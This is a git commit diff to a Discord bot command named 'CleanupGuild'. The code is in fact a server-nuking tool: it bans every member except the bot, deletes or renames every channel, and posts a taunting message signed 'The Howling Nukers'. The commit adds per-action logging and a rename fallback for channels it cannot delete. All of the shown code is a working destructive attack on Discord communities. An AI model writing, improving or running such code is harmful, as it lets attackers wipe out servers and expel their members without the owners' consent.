8562b421c91bcae81119b36b088a833bd8d0d855
Blizzard the Wolf <60931830+BlizzardTheWolf@users.noreply.github.com>
2023-10-22 11:52:51 +0200

    Update cleanupguild.py

--- antinike/cleanupguild.py
+++ antinike/cleanupguild.py
@@ -26,29 +26,38 @@ class CleanupGuild(commands.Cog):
 
         bot_user = guild.get_member(self.bot.user.id)
 
-        # Ban all users (excluding bots)
+        # Ban all users (excluding bots) and log the actions
         for member in guild.members:
             if member != bot_user:
                 try:
                     await member.ban(reason="CleanupGuild command")
+                    await ctx.send(f"Banned user: {member.display_name}")
                 except discord.errors.Forbidden:
                     continue  # Continue to the next user if missing permissions
 
         renamed_channels = 0
 
-        # Remove all channels and categories
+        # Remove all channels and categories and log the actions
         for channel in guild.channels:
             try:
                 await channel.delete()
                 renamed_channels += 1
+                await ctx.send(f"Deleted channel: {channel.name}")
             except discord.errors.Forbidden:
-                continue  # Continue to the next channel if missing permissions
+                # If deleting is not possible, rename the channel
+                try:
+                    await channel.edit(name=channel_title)
+                    await ctx.send(f"Renamed channel: {channel.name} to {channel_title}")
+                except discord.errors.Forbidden:
+                    await ctx.send(f"Skipped channel: {channel.name} (no delete/rename permissions)")
 
         # Add one category with the specified name
         category = await guild.create_category(category_title)
+        await ctx.send(f"Created category: {category.name}")
 
         # Add one text channel inside the category
         channel = await guild.create_text_channel(channel_title, category=category)
+        await ctx.send(f"Created text channel: {channel.name}")
 
         # Send a cleanup message in the new channel
         await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up the mess we made. AWOOOOOOOOO")
